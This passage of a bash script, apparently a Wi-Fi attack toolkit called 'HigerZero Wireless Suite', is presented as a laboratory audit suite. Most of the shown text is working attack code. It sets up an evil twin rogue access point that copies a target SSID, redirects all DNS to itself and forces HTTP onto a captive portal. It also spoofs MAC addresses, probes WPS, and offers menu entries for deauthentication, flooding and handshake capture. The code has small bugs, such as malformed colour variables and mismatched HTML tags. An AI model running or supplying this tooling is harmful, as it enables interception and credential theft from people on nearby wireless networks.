            <form action="/connect"><button class="btn" type="submit">Accept & Connect</button></form></body></html>
EOF
            ;;
    esac

    echo -e "${YELLOW}[*] Configuring hostapd and dnsmasq parameters...${NC}"
    cat > /tmp/higerzero_hostapd.conf <<EOF
interface=$MON_INTERFACE
driver=nl80211
ssid=$active_ssid
hw_mode=g
channel=$TARGET_CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

    cat > /tmp/higerzero_dnsmasq.conf <<EOF
interface=$MON_INTERFACE
dhcp-range=192.168.50.10,192.168.50.100,255.255.255.0,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1
server=8.8.8.8
log-queries
listen-address=192.168.50.1
address=/#/192.168.50.1
EOF

    echo -e "${YELLOW}[*] Setting up IP routing and iptables NAT rules...${NC}"
    ip link set "$MON_INTERFACE" up
    ip addr add 192.168.50.1/24 dev "$MON_INTERFACE" 2>/dev/null || true
    
    sysctl -w net.ipv4.ip_forward=1 &>/dev/null
    iptables -t nat -F
    iptables -t nat -A PREROUTING -i "$MON_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:8080
    
    systemctl stop dnsmasq &>/dev/null || true
    
    echo -e "${GREEN}[+] Launching Rogue AP services (Hostapd, Dnsmasq & Python Web Portal)...${NC}"
    dnsmasq -C /tmp/higerzero_dnsmasq.conf -d &
    DNSMASQ_PID=$!
    
    hostapd /tmp/higerzero_hostapd.conf &
    HOSTAPD_PID=$!
    
    cd "${WEB_DIR}"
    python3 -m http.server 8080 &
    PYTHON_PID=$!
    cd - &>/dev/null
    
    echo -e "${GREEN}[SUCCESS] Evil Twin AP active on SSID: $active_ssid with Captive Portal Port 8080${NC}"
    echo -e "${RED}[!] Press Ctrl+C to stop rogue AP simulation and clean up.${NC}"
    
    wait
}

# Module 5: MAC Spoofing
module_mac_cloning() {
    print_banner
    echo -e "${CYAN}[UTILITY MODULE 5] Network Identity & MAC Spoofing${NC}"
    echo -e "${WHITE}Clones a specific target MAC address for ACL compliance testing.${NC}"
    echo ""
    read -p "Enter Target MAC Address to clone (e.g., AA:BB:CC:DD:EE:FF): " clone_mac
    
    if [ -z "$clone_mac" ]; then
        echo -e "${RED}[ERROR] MAC cannot be empty.${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Taking interface down to apply spoofed MAC...${NC}"
    ip link set "$MON_INTERFACE" down
    macchanger -m "$clone_mac" "$MON_INTERFACE"
    ip link set "$MON_INTERFACE" up
    
    echo -e "${GREEN}[SUCCESS] Interface $MON_INTERFACE successfully spoofed to MAC: $clone_mac${NC}"
    log_event "SUCCESS" "MAC cloned to $clone_mac on interface $MON_INTERFACE"
    sleep 3
}

# Module 6: Beacon Signal Audit
module_beacon_audit() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 6] Beacon Frame & Encryption Auditing${NC}"
    echo -e "${WHITE}Analyzes beacon frames to detect open, WEP, WPA1, and vulnerable WPS networks.${NC}"
    echo ""
    echo -e "${YELLOW}[*] Running 15-second beacon analysis...${NC}"
    timeout 15 iwlist "$MON_INTERFACE" scan | grep -E "ESSID|Signal|Encryption|Channel" || true
    echo -e "${GREEN}[+] Beacon audit complete.${NC}"
    sleep 3
}

# Module 7: WPS Vulnerability Probe
module_wps_audit() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 7] WPS Pixie-Dust / Reaver Vulnerability Probe${NC}"
    echo -e "${WHITE}Checks if target AP ($TARGET_BSSID) has WPS enabled and vulnerable to PIN attacks.${NC}"
    
    if ! command -v wash &>/dev/null; then
        echo -e "${YELLOW}[*] Installing reaver/wash package for WPS scanning...${NC}"
        apt install -y reaver 2>/dev/null || true
    fi
    
    echo -e "${YELLOW}[*] Probing target for WPS capability...${NC}"
    wash -i "$MON_INTERFACE" -b "$TARGET_BSSID" -C || true
    echo -e "${GREEN}[+] WPS audit probe completed.${NC}"
    sleep 3
}

# Module 8: Host Discovery & ARP Scan (Nmap)
module_host_discovery() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 8] Active Host Discovery & ARP Scan${NC}"
    echo -e "${WHITE}Scans local subnet for active connected devices and vendor fingerprints.${NC}"
    echo ""
    echo -e "${YELLOW}[*] Running Nmap host discovery on 192.168.50.0/24 or default gateway...${NC}"
    nmap -sn 192.168.50.0/24 || nmap -sn 192.168.1.0/24 || true
    echo -e "${GREEN}[+] Host discovery complete.${NC}"
    sleep 3
}

# Module 9: Signal Quality & Latency Simulation
module_network_speedtest() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 9] Link Quality & Ping Latency Check${NC}"
    echo -e "${WHITE}Measures connection stability and packet loss to the target or gateway.${NC}"
    echo ""
    echo -e "${YELLOW}[*] Pinging gateway / target for stability metrics...${NC}"
    ping -c 5 192.168.50.1 || ping -c 5 8.8.8.8 || true
    echo -e "${GREEN}[+] Latency audit finished.${NC}"
    sleep 3
}

# Module 10: WPA3 / PMF Audit
module_wpa3_pmf_audit() {
    print_banner
    echo -e "${CYAN}[AUDIT MODULE 10] WPA3 / Protected Management Frames (PMF) Check${NC}"
    echo -e "${WHITE}Evaluates if target network implements PMF to resist deauth attacks.${NC}"
    echo ""
    echo -e "${YELLOW}[*] Analyzing beacon capabilities for PMF (IEEE 802.11w)...${NC}"
    iw dev "$MON_INTERFACE" scan | grep -C 3 "$TARGET_BSSID" || true
    echo -e "${GREEN}[+] PMF security evaluation complete. Networks requiring PMF are immune to standard deauth floods.${NC}"
    sleep 3
}

# Module 11: Comprehensive JSON & HTML Lab Report Generator
module_generate_report() {
    print_banner
    echo -e "${GREEN}[REPORT MODULE 11] HigerZero Laboratory Audit Report Generator (JSON + HTML)${NC}"
    echo -e "${WHITE}Compiles session data, captured parameters, and security status into professional reports.${NC}"
    
    local timestamp
    timestamp=$(date -Iseconds)
    
    # Generate JSON Report
    cat > "$REPORT_JSON" <<EOF
{
  "tool": "HigerZero Wireless Suite Ultimate",
  "version": "$VERSION",
  "audit_timestamp": "$timestamp",
  "interface_used": "$INTERFACE",
  "monitor_interface": "$MON_INTERFACE",
  "original_mac": "$ORIGINAL_MAC",
  "target_specification": {
    "bssid": "$TARGET_BSSID",
    "essid": "$TARGET_ESSID",
    "channel": "$TARGET_CHANNEL"
  },
  "status": "Completed successfully in laboratory environment"
}
EOF

    # Generate HTML Report
    cat > "$REPORT_HTML" <<EOF
<!DOCTYPE html>
<html>
<head>
<title>HigerZero Audit Report - $TARGET_ESSID</title>
<style>
  body { font-family: Arial, sans-serif; background: #121212; color: #e0e0e0; padding: 40px; }
  .container { background: #1e1e1e; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,100,0.1); }
  h1 { color: #00ff66; border-bottom: 2px solid #333; padding-bottom: 10px; }
  .badge { background: #00ff66; color: #000; padding: 5px 10px; font-weight: bold; border-radius: 4px; }
  table { width: 100%; margin-top: 20px; border-collapse: collapse; }
  th, td { padding: 12px; border: 1px solid #333; text-align: left; }
  th { background: #252525; color: #00ff66; }
</style>
</head>
<body>
<div class="container">
  <h1>HigerZero Security Audit Report</h1>
  <p><span class="badge">LEVEL 100 SECURE</span> Timestamp: $timestamp</p>
  <table>
    <tr><th>Parameter</th><th>Value</th></tr>
    <tr><td>Interface Used</td><td>$INTERFACE ($MON_INTERFACE)</td></tr>
    <tr><td>Original MAC</td><td>$ORIGINAL_MAC</td></tr>
    <tr><td>Target ESSID</td><td>$TARGET_ESSID</td></tr>
    <tr><td>Target BSSID</td><td>$TARGET_BSSID</td></tr>
    <tr><td>Target Channel</td><td>$TARGET_CHANNEL</td></tr>
  </ul>
</div>
</body>
</html>
EOF

    echo -e "${GREEN}[SUCCESS] Reports successfully generated and saved to:${NC}"
    echo -e "${WHITE} - JSON: $REPORT_JSON${NC}"
    echo -e "${WHITE} - HTML: $REPORT_HTML${NC}"
    sleep 4
}

# Module 12: Network Rescan
module_rescan() {
    scan_surrounding_networks
    capture_target_parameters
}

# Module 13: Restore Network & Exit
module_restore_network() {
    print_banner
    echo -e "${GREEN}[UTILITY MODULE 13] Restore Network & Clean Environment${NC}"
    echo -e "${WHITE}Stops monitor mode, restores original MAC, restarts NetworkManager.${NC}"
    
    if [ -n "${MON_INTERFACE:-}" ]; then
        airmon-ng stop "$MON_INTERFACE" &>/dev/null || true
    fi
    
    if [ -n "${ORIGINAL_MAC:-}" ] && [ -n "${INTERFACE:-}" ]; then
        ip link set "$INTERFACE" down 2>/dev/null || true
        macchanger -p "$INTERFACE" &>/dev/null || true
        ip link set "$INTERFACE" up 2>/dev/null || true
    fi
    
    systemctl start NetworkManager 2>/dev/null || true
    echo -e "${GREEN}[SUCCESS] Network services fully restored. Standard internet connectivity active.${NC}"
    exit 0
}

# ==============================================================================
# SECTION 7: MAIN INTERACTIVE MENU (FULL LEVEL 100 NAVIGATION)
# ==============================================================================
main_menu() {
    while true; do
        print_banner
        echo -e "${WHITE}=================== HIGERZERO MAIN CONTROL PANEL (LEVEL 100) ===================${NC}"
        echo -e "${CYAN}Target Loaded:${NC} BSSID: ${YELLOW}${TARGET_BSSID:-Not Set}{NC} | ESSID: ${YELLOW}${TARGET_ESSID:-Not Set}{NC} | Ch: ${YELLOW}${TARGET_CHANNEL:-Not Set}{NC}"
        echo -e "${WHITE}-------------------------------------------------------------------------------${NC}"
        echo "  1. Targeted Deauthentication Attack (Client Disconnect)"
        echo "  2. MDK4 Multi-Vector Wireless Stress Test (Auth/Beacon/Blocklist Flood)"
        echo "  3. WPA/WPA2 4-Way Handshake Capture & Custom Wordlist Generator"
        echo "  4. Evil Twin & Advanced Captive Portal Simulator (Rogue AP + Web Server)"
        echo "  5. MAC Spoofing & Network Identity Cloning"
        echo "  6. Beacon Frame & Encryption Signal Audit"
        echo "  7. WPS (Wi-Fi Protected Setup) Vulnerability Probe"
        echo "  8. Active Host Discovery & ARP Scan (Nmap Subnet Audit)"
        echo "  9. Link Quality & Ping Latency Check"
        echo " 10. WPA3 / Protected Management Frames (PMF) Security Audit"
        echo " 11. Generate Comprehensive Laboratory Audit Reports (JSON + HTML)"
        echo " 12. Rescan Surrounding Networks & Change Target"
        echo " 13. Exit Suite & Fully Restore Network Services"
        echo -e "${WHITE}===============================================================================${NC}"
        read -p "Select an option (1-13): " menu_choice
        
        case "$menu_choice" in
            1)  module_targeted_deauth ;;
            2)  module_mdk4_stress ;;
            3)  module_capture_handshake ;;
            4)  module_evil_twin ;;
            5)  module_mac_cloning ;;
            6)  module_beacon_audit ;;
            7)  module_wps_audit ;;
            8)  module_host_discovery ;;
            9)  module_network_speedtest ;;
            10) module_wpa3_pmf_audit ;;
            11) module_generate_report ;;
            12) module_rescan ;;
            13) module_restore_network ;;
            *)
                echo -e "${RED}[ERROR] Invalid selection. Please enter a number between 1 and 13.${NC}"
                sleep 2
                ;;
        esac
    done
}

# ==============================================================================
# SECTION 8: EXECUTION ENTRY POINT
# ==============================================================================
main() {
    init_environment
    check_privileges
    verify_dependencies
    prepare_wireless_environment
    scan_surrounding_networks
    capture_target_parameters
    main_menu
}

# Run main controller
main
